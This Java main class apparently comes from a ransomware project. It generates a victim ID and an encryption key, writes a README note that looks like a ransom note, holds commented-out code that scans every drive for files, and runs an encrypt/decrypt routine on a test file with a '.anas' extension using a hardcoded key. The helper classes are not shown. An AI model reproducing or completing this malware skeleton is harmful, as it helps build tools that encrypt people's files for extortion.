package main;


import encryption.EncryptionAndDecryption;
import files.CreateReadMeFile;
import files.GetFiles;
import genrators.GenerateID;
import genrators.GenerateKey;

import javax.crypto.Cipher;
import java.io.File;
import java.util.ArrayList;

public class Main {
    public static void main(String[] args) {
        String id = new GenerateID(20).getID();
        String key = new GenerateKey(16).getKye();
        CreateReadMeFile readMeFile = new CreateReadMeFile(id, key, 0.0f);

        GetFiles files = new GetFiles();

        /*for (File dir : files.getDrivers())
            System.out.println(dir);
        ArrayList<File> filesU = files.scanFiles(files.getDrivers()[0]);

        for ( File f : filesU)
            System.out.println(f);
        System.out.println("Num of files: " + filesU.size());*/

        EncryptionAndDecryption.encryptionAndDecryption(Cipher.DECRYPT_MODE, "1234567891234567", new File("test.txt.anas"));
    }
}
